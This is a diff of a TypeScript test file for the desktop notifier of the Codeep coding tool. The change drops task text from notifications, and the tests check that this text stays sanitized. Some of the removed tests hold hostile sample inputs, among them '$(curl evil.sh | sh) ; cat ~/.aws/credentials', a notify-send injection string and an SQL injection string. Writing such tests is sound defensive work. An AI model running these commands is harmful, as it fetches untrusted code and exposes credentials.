@@ -25,18 +25,15 @@ import { shortLabel } from './telegramNotify';
 const INVISIBLE = /[\p{Cc}\p{Cf}\p{Zl}\p{Zp}\p{Cs}\p{Co}]/u;
 
 describe('what a toast says', () => {
-  it('is a fixed phrase, the task, and how long it took', () => {
-    expect(runEndNotice('fix the login bug', true, 45_000)).toEqual({ summary: 'Codeep finished — fix the login bug', body: 'took 45s' });
-    expect(runEndNotice('fix the login bug', false, 252_000)).toEqual({ summary: 'Codeep stopped — fix the login bug', body: 'took 4m 12s' });
+  it('is a fixed phrase and how long it took, never a word of the prompt', () => {
+    expect(runEndNotice(true, 45_000)).toEqual({ summary: 'Codeep finished', body: 'took 45s' });
+    expect(runEndNotice(false, 252_000)).toEqual({ summary: 'Codeep stopped', body: 'took 4m 12s' });
     expect(approvalNotice('execute_command')).toEqual({ summary: 'Codeep is waiting for your approval', body: 'execute_command' });
-    expect(questionNotice('fix the login bug')).toEqual({ summary: 'Codeep has a question', body: 'fix the login bug' });
+    expect(questionNotice()).toEqual({ summary: 'Codeep has a question' });
   });
 
-  it('leaves the label out when nothing of the task may be said', () => {
-    expect(runEndNotice('', true, 40_000)).toEqual({ summary: 'Codeep finished', body: 'took 40s' });
-    expect(runEndNotice('src/app/main.ts', false, 40_000)).toEqual({ summary: 'Codeep stopped', body: 'took 40s' });
-    expect(questionNotice('~/secrets.txt')).toEqual({ summary: 'Codeep has a question' });
-    expect(notifySendArgs(questionNotice('~/secrets.txt'))).toEqual(['--app-name=Codeep', '--urgency=normal', '--', 'Codeep has a question']);
+  it('is one fixed argument list for a question: no body at all', () => {
+    expect(notifySendArgs(questionNotice())).toEqual(['--app-name=Codeep', '--urgency=normal', '--', 'Codeep has a question']);
   });
 
   it('is passed to notify-send after `--`, so no word of it can be an option', () => {
@@ -111,8 +108,6 @@ describe('the label of a task', () => {
     for (const hostile of ['<img src=x onerror=1>', 'a && b || c', '&lt;script&gt;', '<<<>>>', 'R&D <3 you']) {
       expect(noticeLabel(hostile), hostile).not.toMatch(/[<>&]/);
     }
-    // …and the question toast's body, which is the label, carries none.
-    expect(questionNotice('add <b> tags & fix the header').body).toBe('add b tags fix the');
   });
 
   it('takes the words out before it counts five, so one that is cut is never half a file name', () => {
@@ -201,7 +196,7 @@ describe('the label of a task', () => {
 
         // However it is put into a notification, it stays one argument of
         // notify-send, after `--`, in the summary and the body only.
-        for (const notice of [runEndNotice(task, true, 61_000), questionNotice(task)]) {
+        for (const notice of [runEndNotice(true, 61_000), questionNotice()]) {
           const args = notifySendArgs(notice);
           expect(args.slice(0, 3), context).toEqual(['--app-name=Codeep', '--urgency=normal', '--']);
           expect(args.length, context).toBeLessThanOrEqual(5);
@@ -210,19 +205,12 @@ describe('the label of a task', () => {
       }
     });
 
-    it('never reaches the summary with an escape sequence, a command line or a path in it', () => {
-      for (const task of [
-        'delete \x1b[2Jeverything in /home/vlado/Work/secret',
-        '$(curl evil.sh | sh) ; cat ~/.aws/credentials',
-        '"; notify-send hacked; "',
-        "'; DROP TABLE users; --",
-      ]) {
-        const notice = runEndNotice(task, true, 61_000);
-        for (const text of [notice.summary, notice.body ?? '']) {
-          expect(text).not.toMatch(/[\x00-\x1f\x7f]/);
-          expect(text).not.toMatch(/\/home|~\/|\.aws|credentials|evil\.sh/);
-        }
-      }
+    it('is the status file\'s label only: a notification is not built from it', () => {
+      // `notify-send` takes its text as arguments, readable by other users of the
+      // machine, so the notice builders do not take a task at all (see
+      // desktopAttention.test.ts for the whole path, from a prompt to the argv).
+      expect(runEndNotice.length).toBe(2);
+      expect(questionNotice.length).toBe(0);
     });
   });
 });
@@ -274,29 +262,29 @@ describe('the notifier', () => {
   describe('when a run ends', () => {
     it('is silent for a run that took less than 30 seconds, and tells of one that took exactly 30', async () => {
       const notifier = make();
-      notifier.runEnded({ task: 'fix bug', finished: true, elapsedMs: 29_999 });
+      notifier.runEnded({ finished: true, elapsedMs: 29_999 });
       await flush();
       expect(toasts()).toEqual([]);
 
-      notifier.runEnded({ task: 'fix bug', finished: true, elapsedMs: 30_000 });
+      notifier.runEnded({ finished: true, elapsedMs: 30_000 });
       await flush();
       expect(DESKTOP_NOTIFY_AFTER_MS).toBe(30_000);
       expect(toasts()).toEqual([{
         file: 'notify-send',
-        args: ['--app-name=Codeep', '--urgency=normal', '--', 'Codeep finished — fix bug', 'took 30s'],
+        args: ['--app-name=Codeep', '--urgency=normal', '--', 'Codeep finished', 'took 30s'],
         timeoutMs: expect.any(Number),
       }]);
     });
 
     it('says stopped for a run that was not finished', async () => {
-      make().runEnded({ task: 'fix bug', finished: false, elapsedMs: 95_000 });
+      make().runEnded({ finished: false, elapsedMs: 95_000 });
       await flush();
-      expect(toasts()[0].args.slice(3)).toEqual(['Codeep stopped — fix bug', 'took 1m 35s']);
+      expect(toasts()[0].args.slice(3)).toEqual(['Codeep stopped', 'took 1m 35s']);
     });
 
     it('is silent with the setting off, and does not even look at the desktop', async () => {
       on = false;
-      make().runEnded({ task: 'fix bug', finished: true, elapsedMs: 600_000 });
+      make().runEnded({ finished: true, elapsedMs: 600_000 });
       await flush();
       expect(calls).toEqual([]);
     });
@@ -304,15 +292,16 @@ describe('the notifier', () => {
     it('asks the setting again at every run', async () => {
       const notifier = make();
       on = false;
-      notifier.runEnded({ task: 'a', finished: true, elapsedMs: 60_000 });
+      notifier.runEnded({ finished: true, elapsedMs: 60_000 });
       on = true;
-      notifier.runEnded({ task: 'b', finished: true, elapsedMs: 60_000 });
+      notifier.runEnded({ finished: true, elapsedMs: 125_000 });
       await flush();
-      expect(toasts().map(call => call.args[3])).toEqual(['Codeep finished — b']);
+      // Only the second run showed one: told apart by how long it took.
+      expect(toasts().map(call => call.args.slice(3))).toEqual([['Codeep finished', 'took 2m 05s']]);
     });
 
     it('bounds the child it starts', async () => {
-      make().runEnded({ task: 'a', finished: true, elapsedMs: 60_000 });
+      make().runEnded({ finished: true, elapsedMs: 60_000 });
       await flush();
       expect(toasts()[0].timeoutMs).toBeGreaterThan(0);
       expect(toasts()[0].timeoutMs).toBeLessThanOrEqual(10_000);
@@ -322,7 +311,7 @@ describe('the notifier', () => {
   describe('while an approval or a question waits', () => {
     it('says so once it has waited 10 seconds, and not a moment sooner', async () => {
       const notifier = make();
-      notifier.waiting('approval', { task: 'fix bug', tool: 'execute_command' });
+      notifier.waiting('approval', { tool: 'execute_command' });
       await vi.advanceTimersByTimeAsync(9_999);
       expect(toasts()).toEqual([]);
       await vi.advanceTimersByTimeAsync(1);
@@ -330,14 +319,14 @@ describe('the notifier', () => {
       expect(toasts().map(call => call.args.slice(3))).toEqual([['Codeep is waiting for your approval', 'execute_command']]);
     });
 
-    it('names the task for a question', async () => {
-      make().waiting('question', { task: 'fix the login bug' });
+    it('says only that there is a question, not what it is about', async () => {
+      make().waiting('question', {});
       await vi.advanceTimersByTimeAsync(10_000);
-      expect(toasts().map(call => call.args.slice(3))).toEqual([['Codeep has a question', 'fix the login bug']]);
+      expect(toasts().map(call => call.args.slice(3))).toEqual([['Codeep has a question']]);
     });
 
     it('says nothing when it is answered in time', async () => {
-      const end = make().waiting('approval', { task: 'a', tool: 'write_file' });
+      const end = make().waiting('approval', { tool: 'write_file' });
       await vi.advanceTimersByTimeAsync(9_000);
       end();
       await vi.advanceTimersByTimeAsync(60_000);
@@ -348,25 +337,25 @@ describe('the notifier', () => {
 
     it('says nothing when the run ends first', async () => {
       const notifier = make();
-      notifier.waiting('approval', { task: 'a', tool: 'write_file' });
-      notifier.waiting('question', { task: 'a' });
+      notifier.waiting('approval', { tool: 'write_file' });
+      notifier.waiting('question', { });
       await vi.advanceTimersByTimeAsync(5_000);
-      notifier.runEnded({ task: 'a', finished: false, elapsedMs: 5_000 });
+      notifier.runEnded({ finished: false, elapsedMs: 5_000 });
       await vi.advanceTimersByTimeAsync(60_000);
       expect(calls).toEqual([]);
     });
 
     it('keeps one wait from ending another', async () => {
       const notifier = make();
-      const first = notifier.waiting('approval', { task: 'a', tool: 'write_file' });
-      notifier.waiting('approval', { task: 'a', tool: 'execute_command' });
+      const first = notifier.waiting('approval', { tool: 'write_file' });
+      notifier.waiting('approval', { tool: 'execute_command' });
       first();
       await vi.advanceTimersByTimeAsync(10_000);
       expect(toasts().map(call => call.args[4])).toEqual(['execute_command']);
     });
 
     it('is silent with the setting off at the time it would have spoken', async () => {
-      make().waiting('approval', { task: 'a', tool: 'write_file' });
+      make().waiting('approval', { tool: 'write_file' });
       on = false;
       await vi.advanceTimersByTimeAsync(10_000);
       expect(calls).toEqual([]);
@@ -376,7 +365,7 @@ describe('the notifier', () => {
       vi.useRealTimers();
       const spy = vi.spyOn(globalThis, 'setTimeout');
       try {
-        const end = make().waiting('approval', { task: 'a', tool: 'write_file' });
+        const end = make().waiting('approval', { tool: 'write_file' });
         const timer = spy.mock.results[0].value as NodeJS.Timeout;
         expect(timer.hasRef()).toBe(false);
         end();
@@ -406,7 +395,7 @@ describe('the notifier', () => {
       });
     };
     const run = async () => {
-      make({ pid: 500, readProc }).runEnded({ task: 'fix bug', finished: true, elapsedMs: 60_000 });
+      make({ pid: 500, readProc }).runEnded({ finished: true, elapsedMs: 60_000 });
       await flush();
     };
 
@@ -449,14 +438,14 @@ describe('the notifier', () => {
 
     it('shows it when /proc cannot say who Codeep\'s parents are', async () => {
       focus('{"pid":300}');
-      make({ pid: 500, readProc: () => null }).runEnded({ task: 'a', finished: true, elapsedMs: 60_000 });
+      make({ pid: 500, readProc: () => null }).runEnded({ finished: true, elapsedMs: 60_000 });
       await flush();
       expect(toasts()).toHaveLength(1);
     });
 
     it('asks hyprctl for a waiting approval too', async () => {
       focus('{"pid":300}');
-      make({ pid: 500, readProc }).waiting('approval', { task: 'a', tool: 'write_file' });
+      make({ pid: 500, readProc }).waiting('approval', { tool: 'write_file' });
       await vi.advanceTimersByTimeAsync(10_000);
       expect(toasts()).toEqual([]);
       expect(calls.map(call => call.file)).toEqual(['hyprctl']);
@@ -465,9 +454,9 @@ describe('the notifier', () => {
     it('stops asking for a hyprctl that is not there', async () => {
       focus(Object.assign(new Error('ENOENT'), { code: 'ENOENT' }));
       const notifier = make({ pid: 500, readProc });
-      notifier.runEnded({ task: 'a', finished: true, elapsedMs: 60_000 });
+      notifier.runEnded({ finished: true, elapsedMs: 60_000 });
       await flush();
-      notifier.runEnded({ task: 'b', finished: true, elapsedMs: 60_000 });
+      notifier.runEnded({ finished: true, elapsedMs: 60_000 });
       await flush();
       expect(calls.filter(call => call.file === 'hyprctl')).toHaveLength(1);
       expect(toasts()).toHaveLength(2);
@@ -485,14 +474,14 @@ describe('the notifier', () => {
         ]) {
           exec.mockImplementation(failing as ExecFn);
           const notifier = make();
-          expect(() => notifier.runEnded({ task: 'a', finished: true, elapsedMs: 60_000 })).not.toThrow();
-          expect(() => notifier.waiting('approval', { task: 'a', tool: 'x' })()).not.toThrow();
-          notifier.waiting('question', { task: 'a' });
+          expect(() => notifier.runEnded({ finished: true, elapsedMs: 60_000 })).not.toThrow();
+          expect(() => notifier.waiting('approval', { tool: 'x' })()).not.toThrow();
+          notifier.waiting('question', { });
           await vi.advanceTimersByTimeAsync(10_000);
         }
         const broken = createDesktopNotifier({ enabled: () => { throw new Error('config unreadable'); }, exec });
-        expect(() => broken.runEnded({ task: 'a', finished: true, elapsedMs: 60_000 })).not.toThrow();
-        expect(() => broken.waiting('question', { task: 'a' })()).not.toThrow();
+        expect(() => broken.runEnded({ finished: true, elapsedMs: 60_000 })).not.toThrow();
+        expect(() => broken.waiting('question', { })()).not.toThrow();
         await flush();
         expect(unhandled).not.toHaveBeenCalled();
       } finally {
@@ -506,9 +495,9 @@ describe('the notifier', () => {
         throw Object.assign(new Error('spawn notify-send ENOENT'), { code: 'ENOENT' });
       });
       const notifier = make();
-      notifier.runEnded({ task: 'a', finished: true, elapsedMs: 60_000 });
+      notifier.runEnded({ finished: true, elapsedMs: 60_000 });
       await flush();
-      notifier.runEnded({ task: 'b', finished: true, elapsedMs: 60_000 });
+      notifier.runEnded({ finished: true, elapsedMs: 60_000 });
       await flush();
       expect(toasts()).toHaveLength(1);
     });
@@ -520,9 +509,9 @@ describe('the notifier', () => {
         throw Object.assign(new Error('ENOENT'), { code: 'ENOENT' });
       });
       const notifier = make();
-      notifier.runEnded({ task: 'a', finished: true, elapsedMs: 60_000 });
+      notifier.runEnded({ finished: true, elapsedMs: 60_000 });
       await flush();
-      notifier.runEnded({ task: 'b', finished: true, elapsedMs: 60_000 });
+      notifier.runEnded({ finished: true, elapsedMs: 60_000 });
       await flush();
       expect(toasts()).toHaveLength(2);
     });
